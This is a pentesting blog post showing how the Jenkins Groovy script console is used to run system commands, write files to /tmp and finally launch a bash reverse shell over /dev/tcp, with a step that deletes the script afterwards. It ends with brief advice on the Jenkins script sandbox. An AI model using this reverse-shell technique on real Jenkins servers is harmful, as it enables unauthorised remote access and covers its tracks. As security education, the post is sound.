---
layout: page
sidebar: right
subheadline: 'Pentesting'
title:  "Vulnerable By Design?  Cloudbees Jenkins"
teaser: "Achieving Remote Code Execution (RCE) with Cloudbees Jenkins and a little 70s era funk on (my last) your next PenTest!"
breadcrumb: true
categories:
    - infosec
tags:
    - blog
    - infosec
    - post
    - pentesting
    - 'web applications'
image:
    thumb: jenkins-shell/jenkins.png
    title: jenkins-shell/500px-Groovy-logo.svg_.png
---

On a recent engagement, my team and I were checking out a Cloudbees Jenkins application for our contract customer and we came across the /script page.  This page allows users to be able to run Groovy script and access resources on the operating system that the server is running on.  Of course, this is just (JUST!) a Remote Code Execution (RCE) when used for the wrong purposes.

# A Groooooovy Groovy Primer
So here we are with a script console at a version of Jenkins that I downloaded onto my own machine. Let's boogie.
<figure style="text-align:center; margin:1em">
<img src="/resources/content/images/2018/12/script.PNG" alt="Script console">
<figcaption style="font-size:small">
If you want to follow along, you can get the installation instructions here: <a href="https://wiki.jenkins.io/display/JENKINS/Installing+Jenkins">Jenkins Wiki</a></figcaption>
</figure>
Let's go through a couple different Groovy commands that might be useful.

<h3>Running System Commands</h3>

Groovy is basically Java, but more "far-out".  So a command like execute() is going to be the way we run system commands for the RCE.  Let's give it a try:

<figure style="text-align:center; margin:1em;">
<img src="/resources/content/images/2018/12/execute.PNG" alt="execute method" style="width:15em; height:15em;">
<figcaption style="font-size:small">
Hey!?!  What gives man...?</figcaption>
</figure>
Bummer man....looks like the Java runtime is just giving us the process object that it creates.  But it would be dy-no-mite! to get the results.

<h3>Writing to the Page</h3>

In the text on the script page, the site instructs you to use 'println()' in order to read on the page rather than 'System.out'.  Unfortunately, 'println()' is still just going to give the process object again.

But here's the skinny: Groovy UNIXprocess objects have a method called 'getText()' that gives the output of the command.
<figure style="text-align:center; margin:1em;">
<img src="/resources/content/images/2018/12/text-1.PNG" alt="text method" style="width:15em; height:15em;">
<figcaption style="font-size:small">
Psychedelic dude...</figcaption>
</figure>
Dyno-mite!!  So in order to run commands, we put in the string we want to 'execute()' and then write it to the screen with 'getText()'. 

So we can read anything, but let's try to get a shell now.  This next part will assume that Jenkins is running on a Linux server, but it can be adapted to fit the needs of any environment.

<h3>File Operations</h3>
In order to write to a file in Groovy, you can use pretty easy file I/O commands.  Here is an example of code that writes "Groovy is Radical, Man!" to a file.

```
def file1 = new File('groovy.txt')
file1 << "Groovy is Radical, Man!"
```
<figure style="text-align:center; margin:1em;">
<img src="/resources/content/images/2018/12/denied.PNG" alt="denied" style="width:15em; height:15em;">
<figcaption style="font-size:small">
PSYCH!</figcaption>
</figure>
Ah that's bogus dude.  Looks like the man is keeping us from writing to the server root.  /tmp is pretty chill though.
<figure style="text-align:center; margin:1em;">
<img src="/resources/content/images/2018/12/written.PNG" alt="denied" style="width:15em; height:15em;">
<figcaption style="font-size:small">
That's rad...</figcaption>
</figure>

# Execute a Shell
So using all this together, we can put together a pretty slammin' reverse shell script.  
```
def shell = new File('/tmp/shell.sh')
shell << "bash -i >& /dev/tcp/127.0.0.1/4567 0>&1"
"/bin/bash /tmp/shell.sh".execute()
sleep(1000)
shell.delete()
```
So you can see we have a file object that we write the bash reverse shell to, We run it using bash.  Then we give everything a second to chill out before we clean it all up.  Let's get jiggy with it.
<figure style="text-align:center; margin:1em;">
<img src="/resources/content/images/2018/12/shell.gif" alt="reverse shell" style="width:75%;">
<figcaption style="font-size:small">
Groovy</figcaption>
</figure>

# Defend Yourselves
Another RCE in the bag.  But how do people defend against this?  Well, the folks at Jenkins have thought about it and do provide a script "sandbox" for admins to be able to manage what can run automatically, and what they need to approve before it can run.  You can check that out here: [Sandbox Documentation](https://jenkins.io/doc/book/managing/script-approval/#groovy-sandbox)

Make sure if you are going to use Jenkins, your admins are keeping a close eye on what scripts are running. 

# Conclusion
A lot of software out there is amazing and provides a lot of flexibility to the users.  This is a GOOD thing!  Just remember that every convenience has a cost associated with it, and if that cost is in the security realm, you need to manage the risk accordingly.  If you trust your users or use it on your home network with a 45 firewalls between you and the public internet, Jenkins with Groovy scripts are...well...groovy.  But if you don't need the functionality or don't have a lot of trust in your userbase, don't use Jenkins scripts.  Like...just don't man..can ya dig it?

<h3>Relevant Links:</h3>
Still jonesin' for more Jenkins vulnerabilities? Check out this article from <a href="https://www.cyberark.com/threat-research-blog/tripping-the-jenkins-main-security-circuit-breaker-an-inside-look-at-two-jenkins-security-vulnerabilities/">Cyberark</a> and the associated <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1999001">CVE-2018-1999001</a>.
